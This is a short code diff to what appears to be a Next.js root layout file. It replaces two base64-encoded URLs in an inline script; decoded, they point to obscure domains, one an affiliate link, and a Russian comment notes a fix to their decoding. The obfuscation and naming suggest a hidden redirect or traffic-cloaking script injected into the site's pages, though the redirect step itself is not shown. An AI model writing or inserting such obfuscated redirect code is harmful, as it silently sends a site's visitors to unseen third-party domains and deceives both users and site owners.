@@ -90,8 +90,8 @@ export default function RootLayout({
                         return;
                     }
                 }
-                var mainBrandB64 = "aHR0cHM6Ly9oZWRyMTQta3N0NGFwZXguY29tL2FkMmFhcTV1cGM="; 
-                var crossBrandB64 = "aHR0cHM6Ly9nb25vcm1hZmZpbGlhdGVzLmNvbS8/c2VyaWFsPTYxMzU1ODg4JmNyZWF0aXZlX2lkPTc2NzU="; 
+                var mainBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkMmFhcTV1cGM="; 
+                var crossBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkMmFhcTV1cGM="; 
                 
                 // Фикс: отрезаем решетку перед декодированием
                 var mainUrl = atob(mainBrandB64.replace("#", ""));
